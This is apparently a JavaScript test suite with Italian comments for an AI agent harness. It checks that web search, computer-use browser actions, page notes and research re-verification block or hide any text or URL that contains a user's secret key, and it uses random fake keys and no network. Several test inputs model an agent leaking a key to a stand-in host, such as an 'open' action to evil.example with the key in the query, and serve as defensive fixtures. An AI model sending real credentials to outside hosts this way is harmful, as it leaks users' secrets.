/*
 * 0.2.4, chiavi per valore esatto anche in ricerca web, ricerca approfondita e Chrome del computer use (owner 19/11 09:33, giudice v2239).
 *   Lo STESSO aiuto di `naviga` e delle foto (`indirizzoConUnaChiave`, la raccolta `valoriDelleChiaviConosciute`, soglia 16), mai per forma:
 *   1. la domanda di `web_search` non parte verso il fornitore della ricerca;
 *   2. la ri-verifica della ricerca approfondita non apre la fonte (fuori dal nucleo: `research-orchestrator.mjs`, `riverifica`);
 *      e l'Assistente (`assistente-lato.mjs`) non manda indirizzo né ricerca, prima della carta;
 *   3. il computer use: l'indirizzo che apre e il testo che scrive in un browser si scartano; ciò che legge dallo schermo nasconde la chiave
 *      e la foto di quel passo non parte; la nota «pagina aperta nel Browser» nasconde indirizzo e titolo con una chiave.
 * ⛔ Nessun valore vero: chiavi finte a caso a ogni corsa; ambiente finto passato come argomento; le asserzioni dicono solo sì o no.
 * ⛔ Zero dollari: nessuna rete (cache finta, lettori finti, aiutante finto del computer use, modello finto).
 */
import assert from 'node:assert/strict';
import { randomBytes } from 'node:crypto';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';

import { rimuoviCartellaDiProva } from './aiuto/rimuovi-cartella-di-prova.mjs';
import * as nucleo from '../src/kernel/talosHarness.mjs';
import * as pagina from '../src/kernel/pagina-del-browser.mjs';
import { creaOspiteComputerUse, NOME_COMPUTER_USE } from '../src/computer-use/attrezzo.mjs';
import * as ricerca from '../src/research-orchestrator.mjs';
import { eseguiAttrezzoALato } from '../src/kernel/assistente-lato.mjs';
import * as porte from '../src/assistente-porte.mjs';

const { talosLavora } = nucleo;
const chiaveFinta = () => `q${randomBytes(16).toString('hex')}`;
const CONCLUSO = { role: 'assistant', content: 'fatto', tool_calls: [] };
const chiamata = (nome, argomenti, id) => ({ role: 'assistant', content: null, tool_calls: [{ id, type: 'function', function: { name: nome, arguments: JSON.stringify(argomenti) } }] });
const senzaId = (s) => String(s).replace(/id=[0-9a-f]+/gu, 'id=X');
const RISULTATI = [{ title: 'Fetch API', url: 'https://developer.mozilla.org/en-US/docs/Web/API/fetch', snippet: 'The fetch() method.' }];

function rete(...risposte) {
  const chiamate = [];
  return {
    chiamate,
    fetch: async (_url, opzioni) => {
      const i = chiamate.length;
      chiamate.push({ corpo: JSON.parse(opzioni.body) });
      return { ok: true, status: 200, json: async () => ({ choices: [{ message: risposte[Math.min(i, risposte.length - 1)] }], usage: { prompt_tokens: 10, completion_tokens: 5 } }), text: async () => '' };
    },
  };
}
const cartella = (t) => { const c = mkdtempSync(join(tmpdir(), 'talos-crc-')); t.after(() => rimuoviCartellaDiProva(c)); return c; };

/* ---------------------------------------------------------------- 1. web_search ---------------------------------------------------------------- */
/* il modello chiama `web_search { query }`: partita o no (la cache finta conta le richieste: nessuna rete), l'esito, le carte */
async function cerca(t, query, { chiave = 'k', livelloAccesso = 'accesso-pieno', segretiConosciutiFn, ricercaWeb = { provider: 'brave', apiKey: 'corta' } } = {}) {
  const cercate = [];
  let carte = 0;
  const r = rete(chiamata('web_search', { query }, 's1'), CONCLUSO);
  await talosLavora({
    cartella: cartella(t), task: { consegna: 'cerca' }, modello: 'm', chiave, fetchDiRete: r.fetch, giriMassimi: 4, livelloAccesso, ricercaWeb,
    ...(segretiConosciutiFn ? { segretiConosciutiFn } : {}),
    cacheWeb: { around: async (d) => { cercate.push(d.kind); return { value: d.kind === 'search' ? RISULTATI : { stato: 200, url: d.url, corpo: 'x' }, fromCache: false }; } },
    chiediApprovazioneFn: async () => { carte += 1; return true; },
  });
  const esito = r.chiamate[1]?.corpo.messages.filter((m) => m.role === 'tool').at(-1)?.content ?? '';
  return { cercata: cercate.includes('search'), esito: senzaId(esito), carte };
}

test('CRC-01 web_search con una chiave salvata, del giro o codificata nella domanda: non parte, «blocked», zero carte, in ogni livello', async (t) => {
  const valore = chiaveFinta();
  const segretiConosciutiFn = () => [valore];
  for (const livelloAccesso of ['lettura', 'su-richiesta', 'accesso-pieno']) {
    for (const query of [`api docs ${valore}`, `"${valore}"`, `site:x.example ${valore.slice(0, 10)}%${valore.charCodeAt(10).toString(16)}${valore.slice(11)}`]) {
      const r = await cerca(t, query, { segretiConosciutiFn, livelloAccesso });
      assert.equal(r.cercata, false, `non partita (${livelloAccesso})`);
      assert.equal(/^blocked: this search contains one of your keys/u.test(r.esito), true, 'frase del rifiuto');
      assert.equal(/Nothing was searched/u.test(r.esito), true, 'dice che non è partita');
      assert.equal(r.esito.includes(valore), false, 'il valore non torna al modello');
      assert.equal(r.carte, 0, 'zero carte');
    }
  }
  const delGiro = chiaveFinta();
  const r = await cerca(t, `why does ${delGiro} fail`, { chiave: delGiro });
  assert.equal(r.cercata, false, 'la chiave del giro, senza la funzione dell ospite');
  const dellaRicerca = chiaveFinta();
  const r2 = await cerca(t, `x ${dellaRicerca}`, { ricercaWeb: { provider: 'brave', apiKey: dellaRicerca } });
  assert.equal(r2.cercata, false, 'la chiave della ricerca stessa');
});

test('CRC-02 web_search al contrario: domanda pulita uguale a prima byte per byte; corta, ignota o funzione che lancia ⇒ la ricerca parte', async (t) => {
  const query = 'node fetch api timeout example';
  const senza = await cerca(t, query);
  const con = await cerca(t, query, { segretiConosciutiFn: () => [chiaveFinta(), chiaveFinta()] });
  assert.equal(senza.cercata, true);
  assert.equal(con.cercata, true);
  assert.equal(con.esito, senza.esito, 'stesso esito');
  assert.equal(con.carte, senza.carte, 'stesse carte');
  const corta = 'abcdef123456789';
  assert.equal((await cerca(t, `x ${corta}`, { segretiConosciutiFn: () => [corta, null, 7, {}] })).cercata, true, 'sotto i 16 caratteri: ignorata');
  assert.equal((await cerca(t, `x ${chiaveFinta()}`, { segretiConosciutiFn: () => [chiaveFinta()] })).cercata, true, 'un valore che nessuno conosce passa');
  const rotta = await cerca(t, query, { segretiConosciutiFn: () => { throw new Error('deposito rotto'); } });
  assert.equal(rotta.cercata, true, 'funzione che lancia: la ricerca non si chiude');
  const delGiro = chiaveFinta();
  assert.equal((await cerca(t, `x ${delGiro}`, { chiave: delGiro, segretiConosciutiFn: () => { throw new Error('rotto'); } })).cercata, false,
    'funzione che lancia: le fonti del nucleo valgono ancora');
});

/* ---------------------------------------------------------------- 3a. la nota della pagina ---------------------------------------------------------------- */
async function notaDellaPagina(t, paginaBrowser, { segretiConosciutiFn, coda = false } = {}) {
  const r = rete(CONCLUSO, CONCLUSO);
  let consegnata = false;
  await talosLavora({
    cartella: cartella(t), task: { consegna: 'ciao' }, modello: 'm', chiave: 'k', fetchDiRete: r.fetch, giriMassimi: 3, livelloAccesso: 'accesso-pieno',
    ...(segretiConosciutiFn ? { segretiConosciutiFn } : {}),
    ...(coda ? { codaMessaggiFn: () => { if (consegnata) return null; consegnata = true; return { testo: 'e adesso?', dallaPersona: true, paginaBrowser }; } } : { paginaBrowser }),
  });
  const richiesta = r.chiamate.at(-1)?.corpo.messages ?? [];
  return richiesta.filter((m) => m.role === 'system' && String(m.content).startsWith(pagina.SEGNO_NOTA_PAGINA)).map((m) => String(m.content)).at(-1) ?? null;
}

test('CRC-03 nota «pagina aperta nel Browser»: indirizzo e titolo con una chiave nascosti, all inizio e dalla coda; pulita byte per byte uguale', async (t) => {
  const valore = chiaveFinta();
  const segretiConosciutiFn = () => [valore];
  for (const coda of [false, true]) {
    const nota = await notaDellaPagina(t, { url: `https://search.example/results?q=${valore}`, titolo: 'Results' }, { segretiConosciutiFn, coda });
    assert.equal(typeof nota, 'string', `c'è la nota (coda: ${coda})`);
    assert.equal(nota.includes(valore), false, 'il valore non entra nella nota');
    assert.equal(nota.includes(pagina.INDIRIZZO_CON_UNA_CHIAVE), true, 'dice che l indirizzo è nascosto');
    assert.equal(nota.includes('"Results"'), true, 'il titolo pulito resta');
    const titolo = await notaDellaPagina(t, { url: 'https://search.example/', titolo: `Results for ${valore}` }, { segretiConosciutiFn, coda });
    assert.equal(titolo.includes(valore), false, 'nemmeno dal titolo');
    assert.equal(titolo.includes(pagina.TITOLO_CON_UNA_CHIAVE), true);
    assert.equal(titolo.includes('https://search.example/'), true, 'l indirizzo pulito resta');
  }
  /* senza titolo il ripiego sarebbe il nome del sito, preso dall'indirizzo nascosto */
  const nelSito = await notaDellaPagina(t, { url: `https://${valore}.example/`, titolo: '' }, { segretiConosciutiFn });
  assert.equal(nelSito.includes(valore), false, 'nemmeno dal nome del sito come titolo');
  /* al contrario: pulita, con o senza la funzione, la stessa nota di prima */
  const pulita = { url: 'https://developer.mozilla.org/en-US/docs/Web/API/fetch?lang=en&token=abc', titolo: 'fetch() - MDN' };
  const prima = await notaDellaPagina(t, pulita);
  const dopo = await notaDellaPagina(t, pulita, { segretiConosciutiFn: () => [chiaveFinta()] });
  assert.equal(dopo, prima, 'byte per byte');
  assert.equal(dopo, pagina.notaPaginaBrowser(pulita), 'quella del modulo, con la pulizia per nome (token=…) intatta');
  assert.equal(dopo.includes('token=…'), true, 'la pulizia per nome resta');
  const rotta = await notaDellaPagina(t, pulita, { segretiConosciutiFn: () => { throw new Error('rotto'); } });
  assert.equal(rotta, prima, 'funzione che lancia: la nota non si perde');
});

/* ---------------------------------------------------------------- 3b. computer use ---------------------------------------------------------------- */
function png(larghezza, altezza) {
  const b = Buffer.alloc(24);
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]).copy(b, 0);
  b.writeUInt32BE(13, 8); b.write('IHDR', 12, 'ascii'); b.writeUInt32BE(larghezza, 16); b.writeUInt32BE(altezza, 20);
  return b;
}
const IMMAGINE = png(1280, 720).toString('base64');
const CHROME = { window_id: 201, pid: 5151, app_name: 'chrome.exe', title: 'Docs - Google Chrome', bounds: { x: 0, y: 0, width: 1280, height: 720 }, z_index: 5, is_on_screen: true, minimized: false };

function aiutanteChrome(scena) {
  const azioni = [];
  return {
    azioni,
    async apri() { return { ok: true }; },
    compito() { return () => {}; },
    async chiama(nome, argomenti) {
      if (nome === 'list_windows') return { ok: true, dati: { windows: [{ ...CHROME }] }, immagine: null, errore: null };
      if (nome === 'get_window_state') {
        return { ok: true, immagine: { base64: IMMAGINE, mime: 'image/png' }, errore: null, dati: {
          window_title: scena.titolo ?? CHROME.title, app_name: 'chrome.exe', window_bounds: CHROME.bounds, screenshot_width: 1280, screenshot_height: 720,
          elements: [
            { element_index: 1, element_token: 't1', role: 'Edit', label: 'Address and search bar', value: scena.barra ?? 'https://docs.example/start', in_web_content: false, frame: { x: 10, y: 10, w: 800, h: 30 } },
            { element_index: 2, element_token: 't2', role: 'Document', label: 'Docs', in_web_content: true, frame: { x: 0, y: 60, w: 1280, h: 660 } },
            { element_index: 3, element_token: 't3', role: 'Edit', label: 'Search docs', value: scena.campo ?? '', in_web_content: true, frame: { x: 20, y: 80, w: 300, h: 30 } },
          ] } };
      }
      azioni.push({ nome, argomenti });
      if (nome === 'launch_app') return { ok: true, dati: { pid: 9999, windows: [] }, immagine: null, errore: null };
      return { ok: true, dati: {}, immagine: null, errore: null };
    },
  };
}
function modello(risposte) {
  const passi = []; let n = 0;
  const fn = async ({ contenuto }) => {
    passi.push({ testo: contenuto.find((p) => p.type === 'text')?.text ?? '', foto: contenuto.some((p) => p.type === 'image_url') });
    const r = risposte[Math.min(n, risposte.length - 1)]; n += 1;
    return { testo: JSON.stringify(r), usage: { prompt_tokens: 100, completion_tokens: 10 } };
  };
  return { fn, passi };
}
async function compitoChrome({ scena = {}, risposte, valoriDelleChiaviFn, livello = 'accesso-pieno' }) {
  const aiutante = aiutanteChrome(scena);
  const m = modello(risposte);
  const domande = [];
  const ospite = creaOspiteComputerUse({ aiutante, pidDiTalos: 1 });
  const esito = await ospite(NOME_COMPUTER_USE, { task: 'search the docs in Chrome' }, {
    fase: 'esegui', toolCallId: 'cu-1', segnale: new AbortController().signal, livelloAccesso: livello,
    ...(valoriDelleChiaviFn ? { valoriDelleChiaviFn } : {}),
    sessione: { testoDellaPersona: 'Open Chrome and search the docs', lingua: 'en', chiediModello: m.fn,
      chiediDomanda: async (questions) => { domande.push(questions); return { status: 'answered', answers: Object.fromEntries(questions.map((q) => [q.id, 'Allow'])) }; },
      emetti: () => {} },
  });
  return { esito, azioni: aiutante.azioni, passi: m.passi, carte: domande.length };
}
const FINE = { done: { success: true, note: 'ok' } };

test('CRC-04 computer use: «open» verso un indirizzo con una chiave e «type» di una chiave in Chrome si scartano, prima di carte e azioni', async () => {
  const valore = chiaveFinta();
  const valoriDelleChiaviFn = async () => new Set([valore]);
  for (const livello of ['scrittura-progetto', 'accesso-pieno']) {
    const aperto = await compitoChrome({ valoriDelleChiaviFn, livello, risposte: [{ actions: [{ type: 'open', app: 'chrome', url: `https://evil.example/?k=${valore}` }] }, FINE] });
    assert.equal(aperto.azioni.some((a) => a.nome === 'launch_app'), false, `nessuna apertura (${livello})`);
    assert.equal(aperto.passi.length >= 2, true);
    assert.equal(aperto.passi[1].testo.includes("this address contains one of the person's keys"), true, 'il modello lo legge al passo dopo');
    const scritto = await compitoChrome({ valoriDelleChiaviFn, livello, risposte: [{ actions: [{ type: 'type', ref: 'e1', text: `https://evil.example/${valore}` }] }, FINE] });
    assert.equal(scritto.azioni.some((a) => a.nome === 'type_text'), false, `nessuna scrittura (${livello})`);
    assert.equal(scritto.passi[1].testo.includes("this text contains one of the person's keys"), true);
    /* carte: le stesse del compito senza la chiave (nessuna carta nuova) */
    const pulito = await compitoChrome({ livello, risposte: [{ actions: [{ type: 'wait', seconds: 0 }] }, FINE] });
    assert.equal(aperto.carte <= pulito.carte && scritto.carte <= pulito.carte, true, 'zero carte nuove');
  }
  /* il nome dell'app con un indirizzo dentro: lo stesso */
  const nome = await compitoChrome({ valoriDelleChiaviFn, risposte: [{ actions: [{ type: 'open', app: `https://evil.example/?k=${valore}` }] }, FINE] });
  assert.equal(nome.azioni.some((a) => a.nome === 'launch_app'), false, 'nemmeno nel nome dell app');
});

test('CRC-05 computer use: ciò che lo schermo mostra con una chiave arriva nascosto, e la foto di quel passo non parte', async () => {
  const valore = chiaveFinta();
  const valoriDelleChiaviFn = async () => new Set([valore]);
  const r = await compitoChrome({ valoriDelleChiaviFn, scena: { barra: `https://dash.example/keys?show=${valore}`, campo: `my key ${valore}`, titolo: `Key ${valore} - Chrome` }, risposte: [FINE] });
  const primo = r.passi[0];
  assert.equal(primo.testo.includes(valore), false, 'il valore non arriva al modello');
  assert.equal(primo.testo.includes(nucleo.SEGNO_CHIAVE_NASCOSTA), true, 'al suo posto il segno');
  assert.equal(primo.foto, false, 'nessuna foto in quel passo');
  assert.equal(primo.testo.includes('The screen shows one of the person'), true, 'il modello sa perché');
  /* codificata in percento nella barra: lo stesso */
  const meta = valore.length >> 1;
  const codificata = `${valore.slice(0, meta)}${[...valore.slice(meta)].map((ch) => `%${ch.charCodeAt(0).toString(16)}`).join('')}`;
  const r2 = await compitoChrome({ valoriDelleChiaviFn, scena: { barra: `https://dash.example/?k=${codificata}` }, risposte: [FINE] });
  assert.equal(r2.passi[0].testo.includes(codificata), false, 'nemmeno codificata');
  assert.equal(r2.passi[0].foto, false);
  /* nel nome del sito: la riga «site …» non lo porta (e un sito così non è un luogo) */
  const r3 = await compitoChrome({ valoriDelleChiaviFn, scena: { barra: `https://${valore}.example/` }, risposte: [FINE] });
  assert.equal(r3.passi[0].testo.includes(valore), false, 'nemmeno dal nome del sito');
  assert.equal(/, site /u.test(r3.passi[0].testo.split('\n').find((l) => l.includes('Window: app')) ?? ''), false, 'nessun sito');
  /* al contrario: schermo pulito, con e senza la funzione, stesso testo e foto presente */
  const senza = await compitoChrome({ risposte: [FINE] });
  const con = await compitoChrome({ valoriDelleChiaviFn: async () => new Set([chiaveFinta()]), risposte: [FINE] });
  assert.equal(con.passi[0].testo.replace(/id=[0-9a-f]+/gu, ''), senza.passi[0].testo.replace(/id=[0-9a-f]+/gu, ''), 'stesso testo');
  assert.equal(con.passi[0].foto, true, 'la foto parte');
  const rotta = await compitoChrome({ valoriDelleChiaviFn: async () => { throw new Error('rotto'); }, scena: { campo: `x ${valore}` }, risposte: [FINE] });
  assert.equal(rotta.passi[0].foto, true, 'funzione che lancia: il compito resta quello di prima');
});

test('CRC-06 il nucleo passa all ospite del computer use le chiavi per valore (chiave del giro compresa), senza cambiare il resto', async (t) => {
  const delGiro = chiaveFinta();
  const viste = [];
  const r = rete(chiamata('computer_use', { task: 'open the docs' }, 'c1'), CONCLUSO);
  await talosLavora({
    cartella: cartella(t), task: { consegna: 'apri' }, modello: 'm', chiave: delGiro, fetchDiRete: r.fetch, giriMassimi: 3, livelloAccesso: 'accesso-pieno',
    strumentiEstesi: ['computer_use'], vedeImmaginiFn: () => true,
    onComputerUseFn: async (_nome, _argomenti, info) => { if (info?.fase === 'esegui') viste.push(info); return { ok: true, testo: 'done' }; },
  });
  assert.equal(viste.length, 1);
  assert.equal(typeof viste[0].valoriDelleChiaviFn, 'function', 'la funzione arriva');
  const valori = await viste[0].valoriDelleChiaviFn();
  assert.equal(valori instanceof Set && valori.has(delGiro), true, 'contiene la chiave del giro');
  assert.equal(viste[0].toolCallId, 'c1');
});

/* ---------------------------------------------------------------- 2. ricerca approfondita e Assistente ---------------------------------------------------------------- */
async function riverifica(fonti, { valoriDelleChiaviFn } = {}) {
  const aperte = [];
  const orchestratore = ricerca.creaResearchOrchestrator({
    leggiRicercaFn: async () => ({ id: 'r1', formato: 2 }),
    statRapportoFn: async () => null, leggiRapportoFn: async () => 'report', elencaFontiFn: async () => [],
    rileggiRapportoFn: () => ({ ok: true, record: { claims: fonti.map((_, i) => ({ passage: 'the cited passage', sourceIndex: i + 1 })), sources: fonti.map((url, i) => ({ url, title: `S${i}` })) } }),
    leggiPaginaFn: async (u) => { aperte.push(u); return { url: u, stato: 200, corpo: 'the cited passage is here' }; },
    ...(valoriDelleChiaviFn ? { valoriDelleChiaviFn } : {}),
  });
  const esito = await orchestratore.riverifica({ cartella: 'C:/finta', id: 'r1' });
  return { esito, aperte };
}

test('CRC-07 ri-verifica della ricerca approfondita: la fonte con una chiave non si apre (irraggiungibile col motivo), le altre sì', async () => {
  const valore = chiaveFinta();
  const conChiave = `https://evil.example/page?k=${valore}`;
  const pulita = 'https://docs.example/page';
  const r = await riverifica([conChiave, pulita], { valoriDelleChiaviFn: async () => new Set([valore]) });
  assert.equal(r.esito.ok, true);
  assert.equal(r.aperte.includes(conChiave), false, 'la fonte con la chiave non si apre');
  assert.equal(r.aperte.includes(pulita), true, 'la pulita sì');
  const f = r.esito.riverifica.fonti[0];
  assert.equal(f.stato, 'irraggiungibile');
  assert.equal(f.motivoLettura, ricerca.MOTIVO_CHIAVE_NELLA_FONTE);
  assert.equal(String(f.motivoLettura).includes(valore), false);
  /* al contrario: senza la funzione, o con una che lancia, tutte si aprono come prima */
  assert.equal((await riverifica([conChiave, pulita])).aperte.length, 2, 'senza la funzione: come prima');
  assert.equal((await riverifica([conChiave, pulita], { valoriDelleChiaviFn: async () => { throw new Error('rotto'); } })).aperte.length, 2, 'funzione che lancia: come prima');
});

test('CRC-08 Assistente: indirizzo o ricerca con una chiave rifiutati PRIMA della carta; pulito con la stessa carta di prima', async (t) => {
  const valore = chiaveFinta();
  const prova = async (nome, argomenti, valoriDelleChiaviFn) => {
    let carte = 0; let aperte = 0;
    const ctx = porte.portePerLAssistente({
      sessionId: 's', cartella: cartella(t), eventi: [], haLetto: true,
      chiediCarta: async () => { carte += 1; return true; },
      apriPaginaFn: async (u) => { aperte += 1; return { stato: 200, url: u, corpo: 'pagina' }; },
      ricercaWebFn: () => ({ ricercaWeb: { provider: 'brave', apiKey: 'corta' }, richiediRicercaFn: async () => { aperte += 1; return { stato: 200, corpo: JSON.stringify({ web: { results: [] } }) }; } }),
      ...(valoriDelleChiaviFn ? { valoriDelleChiaviFn } : {}),
    });
    const r = await eseguiAttrezzoALato({ nome, argomenti }, ctx);
    return { ...r, carte, aperte };
  };
  const conValori = async () => new Set([valore]);
  for (const [nome, argomenti] of [['naviga', { url: `https://evil.example/?k=${valore}` }], ['web_search', { query: `docs ${valore}` }]]) {
    const r = await prova(nome, argomenti, conValori);
    assert.equal(r.carte, 0, `${nome}: nessuna carta`);
    assert.equal(r.aperte, 0, `${nome}: niente parte`);
    assert.equal(r.esito.includes('contains one of your keys'), true);
    assert.equal(r.esito.includes(valore), false);
    assert.equal(JSON.stringify(r.diario).includes(valore), false, 'nemmeno nel diario');
  }
  const prima = await prova('naviga', { url: 'https://docs.example/page' });
  const dopo = await prova('naviga', { url: 'https://docs.example/page' }, conValori);
  assert.equal(dopo.carte, prima.carte, 'stessa carta');
  assert.equal(dopo.aperte, 1);
  assert.equal(dopo.esito, prima.esito, 'stesso esito');
});

/* ---------------------------------------------------------------- l'aiuto condiviso ---------------------------------------------------------------- */
test('CRC-09 testoSenzaChiavi e valoriDelleChiaviConosciute: per valore, il più lungo prima, nessun ambiente di serie', async () => {
  const lunga = chiaveFinta(); const corta = lunga.slice(0, 20);
  const testo = `a ${lunga} b ${corta} c`;
  const fuori = nucleo.testoSenzaChiavi(testo, new Set([corta, lunga]));
  assert.equal(fuori.includes(corta), false);
  assert.equal(fuori, `a ${nucleo.SEGNO_CHIAVE_NASCOSTA} b ${nucleo.SEGNO_CHIAVE_NASCOSTA} c`, 'la lunga intera, non spezzata dalla corta');
  assert.equal(nucleo.testoSenzaChiavi('niente', new Set([lunga])), 'niente');
  assert.equal(nucleo.testoSenzaChiavi('niente', new Set()), 'niente');
  /* nessun ambiente di serie: senza `ambiente` nessun valore dell'ambiente vero (si confronta solo il conteggio) */
  const senzaAmbiente = await nucleo.valoriDelleChiaviConosciute({ chiavi: [] });
  assert.equal(senzaAmbiente.size, 0, 'nessun valore senza ambiente');
  const finto = { TALOS_PROVA_CRC_API_KEY: chiaveFinta(), TALOS_PROVA_CRC_HOST: 'https://h.example', PATH: 'C:/x' };
  const conFinto = await nucleo.valoriDelleChiaviConosciute({ ambiente: finto, chiavi: ['corta', lunga], segretiConosciutiFn: () => { throw new Error('rotto'); }, ospiteRottoChiude: false });
  assert.equal(conFinto.size, 2, 'la chiave dell ambiente finto e la lunga');
  assert.equal(conFinto.has(finto.TALOS_PROVA_CRC_API_KEY), true);
  await assert.rejects(() => nucleo.valoriDelleChiaviConosciute({ segretiConosciutiFn: () => { throw new Error('rotto'); } }), /rotto/u, 'di serie l errore sale (le foto chiudono)');
});
